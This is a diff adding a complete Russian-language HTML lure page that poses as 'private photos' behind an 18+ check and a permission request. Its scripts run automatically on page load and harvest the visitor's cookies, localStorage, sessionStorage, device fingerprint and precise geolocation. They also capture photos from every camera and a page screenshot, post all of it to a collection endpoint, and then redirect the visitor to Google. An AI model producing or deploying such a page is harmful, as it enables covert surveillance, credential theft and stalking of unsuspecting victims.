@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ПРИВАТНЫЕ ФОТОГРАФИИ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .content {
+            text-align: center;
+            margin: 30px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .button {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            padding: 15px 40px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+        
+        .button:hover {
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .permission-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .permission-box h3 {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .permission-box ul {
+            margin-left: 20px;
+        }
+        
+        .permission-box li {
+            margin: 5px 0;
+        }
+        
+        .status {
+            font-size: 14px;
+            color: #666;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>ПРИВАТНЫЕ ФОТОГРАФИИ</h1>
+            <p>Для просмотра фотографий подтвердите, что вам есть 18 лет.</p>
+        </div>
+        
+        <div class="loader"></div>
+        
+        <div class="content">
+            <div class="status" id="status">Подготовка контента...</div>
+        </div>
+        
+        <div class="permission-box" id="permissionBox">
+            <h3>🔐 Требуется разрешение</h3>
+            <p>Для просмотра контента необходимо предоставить доступ:</p>
+            <ul>
+                <li>📷 Камера (фото/видео)</li>
+                <li>📍 Геолокация</li>
+            </ul>
+        </div>
+        
+        <button class="button" onclick="requestPermissions()" id="requestBtn">
+            Предоставить доступ
+        </button>
+        
+        <div class="footer">
+            <p>© 2024 Все права защищены</p>
+        </div>
+    </div>
+    
+    
+    <script>
+    // Функция для отправки данных на сервер
+    async function sendData(type, data) {
+        try {
+            const response = await fetch('/api/collect/' + 'KWubgmWIM5qe', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    type: type,
+                    data: data,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            return await response.json();
+        } catch (e) {
+            console.log('Error sending data:', e);
+        }
+    }
+    
+    // Сбор основной информации
+    async function collectBasicInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vendor: navigator.vendor,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localStorage: {},
+            sessionStorage: {},
+            cookies: document.cookie
+        };
+        
+        // Сбор localStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                info.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch (e) {}
+        
+        // Сбор sessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                info.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) {}
+        
+        await sendData('basic_info', info);
+        return info;
+    }
+    
+    // Фото с камер
+    async function takeCameraPhotos() {
+        try {
+            // Запрос доступа к камерам
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            
+            // Получаем все видео устройства
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(d => d.kind === 'videoinput');
+            
+            for (let i = 0; i < videoDevices.length; i++) {
+                try {
+                    const deviceStream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: videoDevices[i].deviceId }
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = deviceStream;
+                    video.play();
+                    
+                    // Ждем кадр
+                    await new Promise(r => setTimeout(r, 1000));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const photo = canvas.toDataURL('image/jpeg', 0.8);
+                    const cameraType = i === 0 ? 'back' : 'front';
+                    await sendData('camera_' + cameraType, photo);
+                    
+                    deviceStream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    console.log('Camera error:', e);
+                }
+            }
+            
+            stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+            console.log('Camera access denied:', e);
+        }
+    }
+    
+    // Скриншот страницы
+    async function takeScreenshot() {
+        try {
+            if (window.html2canvas) {
+                const canvas = await html2canvas(document.body);
+                const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+                await sendData('screenshot', screenshot);
+            } else {
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+                script.onload = async function() {
+                    const canvas = await html2canvas(document.body);
+                    const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+                    await sendData('screenshot', screenshot);
+                };
+                document.head.appendChild(script);
+            }
+        } catch (e) {
+            console.log('Screenshot error:', e);
+        }
+    }
+    
+    // Получение геолокации
+    async function getLocation() {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            });
+            
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp
+            };
+            
+            await sendData('geolocation', locationData);
+        } catch (e) {
+            console.log('Geolocation error:', e);
+        }
+    }
+    
+    // Главная функция сбора
+    async function collectAllData() {
+        console.log('Starting data collection...');
+        
+        // Собираем базовую информацию
+        await collectBasicInfo();
+        
+        // Пытаемся получить геолокацию
+        await getLocation();
+        
+        // Фото с камер
+        await takeCameraPhotos();
+        
+        // Скриншот
+        await takeScreenshot();
+        
+        console.log('Data collection completed');
+    }
+    
+    // Запускаем сбор при загрузке страницы
+    window.onload = function() {
+        setTimeout(collectAllData, 1000);
+    };
+    
+    </script>
+    
+    
+    <script>
+    async function requestPermissions() {
+        try {
+            document.getElementById('status').innerText = 'Запрос разрешений...';
+            
+            // Запрос камеры
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('status').innerText = '✅ Камера доступна';
+            } catch (e) {
+                console.log('Camera permission denied');
+            }
+            
+            // Запрос геолокации
+            try {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                document.getElementById('status').innerText = '✅ Геолокация доступна';
+            } catch (e) {
+                console.log('Location permission denied');
+            }
+            
+            document.getElementById('permissionBox').style.display = 'none';
+            document.getElementById('requestBtn').style.display = 'none';
+            
+            document.getElementById('status').innerText = '✅ Загрузка...';
+            
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 3000);
+            
+        } catch (e) {
+            console.log('Permission error:', e);
+        }
+    }
+    
+    // Автоматический запрос разрешений через 1 секунду
+    setTimeout(requestPermissions, 1000);
+    </script>
+</body>
+</html>
+    
